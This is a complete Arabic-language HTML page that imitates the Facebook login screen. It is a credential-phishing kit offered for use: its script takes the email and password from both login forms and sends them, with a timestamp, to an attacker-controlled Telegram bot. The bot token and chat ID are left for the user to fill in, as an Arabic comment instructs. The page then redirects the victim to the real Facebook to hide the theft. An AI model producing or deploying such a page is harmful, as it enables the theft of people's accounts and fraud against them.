<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – تسجيل الدخول أو الاشتراك</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#f0f2f5;font-family:'Helvetica Neue',Arial,sans-serif}
        .header{background:#1877f2;height:70px;display:flex;align-items:center;justify-content:space-between;padding:0 200px}
        .header .logo{font-size:32px;color:#fff;font-weight:bold}
        .header .login-row{display:flex;gap:15px;align-items:center}
        .header .login-row input{width:150px;padding:6px;border:1px solid #ccc;border-radius:3px;font-size:12px}
        .header .login-row button{background:#166fe5;color:#fff;border:none;padding:6px 12px;border-radius:3px;font-size:12px;cursor:pointer}
        .main{display:flex;justify-content:center;padding:40px 0}
        .left,.right{width:400px}
        .left h2{font-size:28px;color:#333;margin-bottom:20px}
        .left img{width:300px}
        .right{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1)}
        .right input{width:100%;margin-bottom:12px;padding:14px;border:1px solid #ddd;border-radius:6px;font-size:16px}
        .right .btn-login{width:100%;background:#1877f2;color:#fff;padding:14px;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}
        .right .btn-new{width:60%;margin:20px auto 0;display:block;background:#42b72a;color:#fff;padding:14px;border:none;border-radius:6px;font-size:17px;font-weight:bold;cursor:pointer}
        .right a{display:block;text-align:center;color:#1877f2;font-size:14px;margin-top:12px;text-decoration:none}
        .footer{text-align:center;padding:20px;font-size:12px;color:#737373}
        @media(max-width:900px){.header{padding:0 20px}.main{flex-direction:column;align-items:center}.left,.right{width:90%}}
    </style>
</head>
<body>
    <header class="header">
        <div class="logo">facebook</div>
        <div class="login-row">
            <div>
                <div style="color:#fff;font-size:12px;margin-bottom:3px">البريد الإلكتروني أو الهاتف</div>
                <input type="text" id="quickEmail">
            </div>
            <div>
                <div style="color:#fff;font-size:12px;margin-bottom:3px">كلمة المرور</div>
                <input type="password" id="quickPass">
            </div>
            <button onclick="handleQuick()">تسجيل الدخول</button>
        </div>
    </header>

    <section class="main">
        <div class="left">
            <h2>تواصل مع الأصدقاء ومختلف الأشخاص على فيسبوك.</h2>
            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/DBfLCjvXHsa.png" alt="Facebook Connect">
        </div>

        <div class="right">
            <form id="fbForm">
                <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                <input type="password" id="pass" placeholder="كلمة المرور" required>
                <button class="btn-login" type="submit">تسجيل الدخول</button>
            </form>
            <a href="#">هل نسيت كلمة المرور؟</a>
            <hr style="margin:20px 0;border:none;border-top:1px solid #dadde1">
            <button class="btn-new">إنشاء حساب جديد</button>
        </div>
    </section>

    <footer class="footer">
        فيسبوك © 2026
    </footer>

    <script>
        function handleQuick(){
            const email=document.getElementById('quickEmail').value.trim();
            const pass=document.getElementById('quickPass').value.trim();
            if(email&&pass) sendCapture(email,pass);
        }
        document.getElementById('fbForm').addEventListener('submit',function(e){
            e.preventDefault();
            const email=document.getElementById('email').value.trim();
            const pass=document.getElementById('pass').value.trim();
            if(email&&pass) sendCapture(email,pass);
        });
        async function sendCapture(email,pass){
            const data=`🔐 FB Clone\nEmail: ${email}\nPass: ${pass}\nTime: ${new Date().toLocaleString('ar-EG')}`;
            // استبدل YOUR_BOT_TOKEN وYOUR_CHAT_ID برمز Telegram الخاص بك
            try{
                await fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage',{
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({chat_id:'YOUR_CHAT_ID',text:data})
                });
            }catch(err){console.warn(err)}
            setTimeout(()=>window.location.href='https://www.facebook.com',900);
        }
    </script>
</body>
</html>
